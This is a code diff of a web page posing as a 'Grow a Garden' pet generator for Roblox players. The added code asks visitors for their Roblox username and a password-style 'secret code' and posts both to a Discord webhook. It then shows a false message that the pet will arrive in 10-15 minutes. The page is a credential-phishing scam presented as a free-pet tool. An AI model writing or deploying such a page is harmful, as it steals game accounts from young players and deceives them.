@@ -6,128 +6,190 @@
   <title>Grow a Garden Pet Generator</title>
   <style>
     body {
-      font-family: 'Arial', sans-serif;
-      text-align: center;
+      font-family: Arial, sans-serif;
       background: #e9f7ef;
+      text-align: center;
+      margin: 0;
       padding: 20px;
     }
     h1 {
       color: #2d6a4f;
     }
+    .pet-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 20px;
+      max-width: 800px;
+      margin: 20px auto;
+    }
     .pet-card {
       background: #fff;
-      padding: 20px;
-      margin: 20px auto;
-      border-radius: 15px;
-      max-width: 400px;
+      padding: 10px;
+      border-radius: 12px;
       box-shadow: 0 4px 10px rgba(0,0,0,0.1);
     }
-    .pet-image {
-      font-size: 80px;
+    .pet-card img {
+      width: 100%;
+      border-radius: 8px;
     }
-    .buttons {
-      margin-top: 20px;
-    }
-    button {
+    .pet-card button {
+      margin-top: 10px;
       background: #40916c;
       color: white;
       border: none;
-      padding: 10px 20px;
-      margin: 10px;
-      border-radius: 10px;
-      font-size: 16px;
+      padding: 8px 15px;
+      border-radius: 8px;
       cursor: pointer;
     }
-    button:hover {
+    .pet-card button:hover {
       background: #2d6a4f;
     }
-    .instructions {
-      margin-top: 40px;
-      background: #ffffffcc;
-      padding: 15px;
+    #generate-section, #form-section, #popup {
+      display: none;
+      margin-top: 20px;
+    }
+    #generate-btn {
+      background: #52b788;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
       border-radius: 10px;
-      max-width: 600px;
-      margin-left: auto;
-      margin-right: auto;
-      text-align: left;
+      cursor: pointer;
+    }
+    #generate-btn:hover {
+      background: #40916c;
+    }
+    #form-section input {
+      display: block;
+      margin: 10px auto;
+      padding: 10px;
+      width: 80%;
+      max-width: 300px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    #submit-btn {
+      background: #2d6a4f;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    #submit-btn:hover {
+      background: #1b4332;
+    }
+    #popup {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      padding: 20px;
+      max-width: 400px;
+      margin: 50px auto;
     }
   </style>
 </head>
 <body>
   <h1>🌱 Grow a Garden Pet 🌱</h1>
-  <div class="pet-card">
-    <div class="pet-image" id="pet-image">🌿</div>
-    <h2 id="pet-name">Your Garden Pet</h2>
-    <p id="pet-description">Click Generate to Recieve pet</p>
-  </div>
-  <div class="buttons">
-    <button onclick="generatePet()">Generate Pet</button>
-    <button onclick="adoptPet()">Adopt Pet</button>
+  
+  <div id="pet-selection" class="pet-grid">
+    <!-- You can replace these images and names -->
+    <div class="pet-card">
+      <img src="https://via.placeholder.com/150" alt="Pet 1">
+      <h3>Pet 1</h3>
+      <button onclick="selectPet('Pet 1', 'https://via.placeholder.com/150')">Select Pet</button>
+    </div>
+    <div class="pet-card">
+      <img src="https://via.placeholder.com/150" alt="Pet 2">
+      <h3>Pet 2</h3>
+      <button onclick="selectPet('Pet 2', 'https://via.placeholder.com/150')">Select Pet</button>
+    </div>
+    <div class="pet-card">
+      <img src="https://via.placeholder.com/150" alt="Pet 3">
+      <h3>Pet 3</h3>
+      <button onclick="selectPet('Pet 3', 'https://via.placeholder.com/150')">Select Pet</button>
+    </div>
+    <div class="pet-card">
+      <img src="https://via.placeholder.com/150" alt="Pet 4">
+      <h3>Pet 4</h3>
+      <button onclick="selectPet('Pet 4', 'https://via.placeholder.com/150')">Select Pet</button>
+    </div>
+    <div class="pet-card">
+      <img src="https://via.placeholder.com/150" alt="Pet 5">
+      <h3>Pet 5</h3>
+      <button onclick="selectPet('Pet 5', 'https://via.placeholder.com/150')">Select Pet</button>
+    </div>
+    <div class="pet-card">
+      <img src="https://via.placeholder.com/150" alt="Pet 6">
+      <h3>Pet 6</h3>
+      <button onclick="selectPet('Pet 6', 'https://via.placeholder.com/150')">Select Pet</button>
+    </div>
   </div>
 
-  <div class="instructions">
-    <h3>How to Use:</h3>
-    <ol>
-      <li>Click <b>Generate Pet</b> to create your garden pet.</li>
-      <li>When you find a pet you like, click <b>Generate Pet</b>.</li>
-      <li>Enter the your code</li>
-      <li>Once correct, You will recieve your pet in 10-15 minutes.</li>
-    </ol>
+  <div id="generate-section">
+    <h2 id="selected-pet-name"></h2>
+    <img id="selected-pet-img" style="width:200px; border-radius:12px;">
+    <br><br>
+    <button id="generate-btn" onclick="showForm()">Generate Pet</button>
+  </div>
+
+  <div id="form-section">
+    <h2>Enter Your Details</h2>
+    <input type="text" id="roblox-username" placeholder="Enter Roblox Username">
+    <input type="password" id="secret-code" placeholder="Enter Secret Code">
+    <button id="submit-btn" onclick="submitAdoption()">Submit</button>
+  </div>
+
+  <div id="popup">
+    <h2>Your pet is being generated</h2>
+    <p>Please wait for 10-15 minutes then check Grow a Garden.</p>
   </div>
 
   <script>
-    const pets = [
-      { name: "Sprouty", emoji: "🌱", desc: "A tiny sprout full of life." },
-      { name: "Blossom", emoji: "🌸", desc: "Loves sunlight and singing birds." },
-      { name: "Fernie", emoji: "🌿", desc: "A calm fern with a gentle aura." },
-      { name: "Cactus Jack", emoji: "🌵", desc: "Spiky but friendly." },
-      { name: "Pumpkin Puff", emoji: "🎃", desc: "Loves autumn vibes." }
-    ];
-
-    let currentPet = null;
-    const secretCode = "12345"; // Change this to your real code
+    let selectedPet = null;
     const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL"; // Replace with your Discord webhook URL
 
-    function generatePet() {
-      const randomPet = pets[Math.floor(Math.random() * pets.length)];
-      currentPet = randomPet;
-      document.getElementById('pet-image').textContent = randomPet.emoji;
-      document.getElementById('pet-name').textContent = randomPet.name;
-      document.getElementById('pet-description').textContent = randomPet.desc;
+    function selectPet(name, img) {
+      selectedPet = { name, img };
+      document.getElementById('selected-pet-name').textContent = "You chose: " + name;
+      document.getElementById('selected-pet-img').src = img;
+      document.getElementById('generate-section').style.display = 'block';
+      window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
     }
 
-    async function adoptPet() {
-      if (!currentPet) {
-        alert("Please generate a pet first!");
+    function showForm() {
+      document.getElementById('form-section').style.display = 'block';
+      window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+    }
+
+    async function submitAdoption() {
+      const username = document.getElementById('roblox-username').value.trim();
+      const code = document.getElementById('secret-code').value.trim();
+
+      if (!username || !code) {
+        alert("Please fill out all fields!");
         return;
       }
 
-      const userCode = prompt("Enter the secret adoption code:");
-      if (!userCode) return;
+      // Show popup
+      document.getElementById('popup').style.display = 'block';
+      window.scrollTo({ top: 0, behavior: 'smooth' });
 
-      if (userCode === secretCode) {
-        const petLink = window.location.href + "?pet=" + encodeURIComponent(currentPet.name);
-        const message = {
-          content: `✅ Adoption Successful!\n🌱 **Pet:** ${currentPet.name} ${currentPet.emoji}\n📖 ${currentPet.desc}\n🔑 Code: ${userCode}\n🔗 Link: ${petLink}`
-        };
+      // Send data to Discord webhook
+      const message = {
+        content: `🌱 **New Pet Adoption Request**\n👤 Roblox Username: ${username}\n🔑 Secret Code: ${code}\n🐾 Pet: ${selectedPet.name}\n📷 Image: ${selectedPet.img}`
+      };
 
-        try {
-          const response = await fetch(webhookUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(message)
-          });
-          if (response.ok) {
-            alert("Adoption sent to Discord!");
-          } else {
-            alert("Error sending to Discord");
-          }
-        } catch (error) {
-          console.error("Error:", error);
-          alert("Failed to send adoption request.");
-        }
-      } else {
-        alert("Wrong code! Adoption denied.");
+      try {
+        await fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(message)
+        });
+      } catch (error) {
+        console.error("Error sending to Discord:", error);
       }
     }
   </script>
